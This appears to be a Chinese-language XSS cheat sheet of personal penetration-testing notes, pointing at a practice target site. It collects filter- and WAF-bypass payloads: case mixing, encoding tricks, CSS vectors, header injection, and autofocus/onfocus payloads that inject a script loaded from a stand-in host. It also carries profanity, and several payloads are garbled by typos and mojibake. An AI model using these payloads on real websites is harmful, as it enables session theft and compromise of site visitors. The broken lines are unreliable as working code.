# XSS
> 详细代码请转常用代码篇，有很多代码分析和实例，此篇仅供思路。
靶场：
http://demo.testfire.net/search.jsp?query=1

首先先打个`<a>,<b>`试试看，康康到底能不能输入一个框啊什么的，试试水对吧。在确定了可以在页面加入一个`<b>`或者一个`<a>`然后尝试后者：

就直接尝试xss语句，虽然90%不行，但是万一呢？对吧！

```
<script>alert('xss');</script>
```



## **如果有过滤**

输入：
```
< > ' " = ;
```
字符查看一下，那些被过滤了，那些被转义了，那些被删除了。


## 首先 构造一个payload

首先一个`xss payload`基本有以下几部分组成

[TAG]填充标签img svg video button...
[ATTR]=Something 填充一些非必要的属性 src=1 xmlns="jp.pornhub.com/"(a君：`兄弟借一步说话`GKDGKD)

[EVENT]填充事件属性onerror onload...
[PAYLOAD]填充JavaScript代码alert(1) top.alert(1)...

大体可以理解为：
```html
<[TAG]    [ATTR]=  sth    [EVENT]   =   [PAYLOAD] />
 标签头    属性     事件   事件属性        代码
```



## **大小写混写，双写绕过**

当一些敏感标签，如`script,img`中间被截断或者删除，可以尝试大小写混写，或者双写绕过:
```
<sCrIpT><>
<Imimgg><>
```




## **尝试闭合标签**

输入没什么过滤，但是无法直接弹窗可以尝试闭合标签然后使xss生效
比如：
```
"> <script>alert(1)</script>
```

## **如何绕过**

### **16进制编码绕过**

将XSS语句经过16进制编码转换来绕过XSS的规则。

列:
```
<script>alert(1)</script>
```
可以转换为
```
%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%78%73%73%22%29%3b%3c%2f%73%63%72%69%70%74%3e
```

## **绕过PHP自带的安全设置**

在php中设置为`magic_quotes_gpc=ON`中安全设置开启，开启后会吧一些特殊字符进行转换，比如：`把'(单引号)转化为：`\`,双引号`"`转换为：``\"``

> 我们可以通过javascript中的`String.fromCharCode`方法来绕过

可以输入为：
```
<script>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88,83, 83, 34, 41, 59)</script>
```





## **利用html标签属性值执行XSS**

很多HTML标记中的属性都支持JavaScript脚本，所以我反手给你个xss你怎么说？上号：
```
<img src = "http://58.221.227.52:82/functions/images/qysb/logo.png">
```
其中只要执行了js代码就可以弹窗，如果引用文件都可以绕过`<>`





## **使用空格，TAB，回车，js编码绕过**

如果过滤时对`JavaScript`进行了过滤，得益于JS代码的**优秀体制**(**该用谁心理有B数了8**)只需要对js做小小的操作即可绕过：
```
<img src= "java　　script:alert(‘xss‘);" width=100>
```
或者：
```
<img src= "javascript:  alert(/xss/);" width=100>
```

或者：
```
<a herf="javascr&#69pt:alert(1)">



```

## **利用CSS跨站解析**

大概就是去在文章引入的CSS中加入一串XSS代码，应为CSS不用嵌入到html中，可以直接从文件或其他地方进行引用。
`但是 浏览器之间不能通用`
```
<div style = "list-style-image:url(javascript:alert(‘xSS‘))">

<link rel = "stylesheet" href ="http://www.xxx.com/atack.css">

<style type=‘text/css‘>@import url(http://www.xxx.com/xss.css);</style>

<style>@import ‘javascript:alert(‘xss‘);‘</style>
```





## **利用字符编码**

利用16进制转换，或者ASCII表转换来进行xss
```
<script>eval("\61\6c\65......");<script>
```






## **尝试在请求包中输入值查看是否被带入数值**

在请求值中尝试加入referer值

```
Referer: aaaa" type="text" onclick="alert(1)"
```
尝试在User-Agent等值中输入值查看是否能够带入数值

```
user=" type="text" onclick="alert(1)"
```

## **构造payload(采用%0a绕过空格过滤)**

如果过滤了`script、/、与空格`
在url中直接加入`%0a`绕过空格过滤，解析出来不一样吗，火狐他不香吗？
```
http://127.0.0.1/xss/level16.php?keyword=<img%0asrc=1%0aonerror=alert(1)>
```












## **如果过滤了双引号和尖括号**

html`实体编码`来过滤尖括号和双引号也是属于编码绕过的一种，测试只有火狐可以实现(A君：谷歌你🐎死了)
```
http://IP/xss/level17.php?arg01=a&arg02=b onmouseover=alert(1)

```

当在url输入被过滤等因素后，可以尝试在输入框中加入`js代码`并使用js实体绕过:















**js实体编码**

javascrip&#x74;:alert(1) 十六进制
javascrip&#116;:alert(1) 十进制









## [**绕WAF**](https://xz.aliyun.com/t/6652)

当你兴致*勃勃* 输入了第一串代码`<b>`,欸？我日你妈 D盾，创宇盾拦截，百度云盾拦截。小逼崽子**D盾**三天之内祝你**心想事成！** 

> D盾还好，只是拦截，你还可以FUZZ,创宇盾直接给你ip封了，md我搞你还要准备几十个ip？

不常见标签

XSSfuzz生成器:https://github.com/NytroRST/XSSFuzzer/blob/master/fuzzer.html

```html
<details> <button> <select> <keygen> <textarea>等等
```

从网上收集的几个payload:
```html

<details open ontoggle=prompt(1)>
      <details open ontoggle=prompt(1)>
      <button onfocus=prompt(1) autofocus>
      <select autofocus onfocus=prompt(1)>

 <input autofocus onfocus=s=createElement("scriPt");body . appendChild(s);s.src="//xss.xx/1te">

 <keygen autofocus onfocus =s=createElement("scriPt" );body . appendchild(s);s. src="//xss.xx/1te">

<textarea autofocus onfocus=s=createElement("scriPt"); bady appendChild(s);s.src="//xss.xx/1te">

<video onkeyup=setTimeout`al\x65rt\x28/2/\x29```>

<svg src=1 onload=alert(1) />
<svg value=1 onload=alert(1) />
<video value=1 onerror=alert(1) />

```



绕 alert

```html
top[11189117..toString(32)](1);
</sCrIpT><svg  onwheel=top[11189117..toString(32)](1);>
```

¼script¾alert(¢XSS¢)¼/script¾
¼b¾1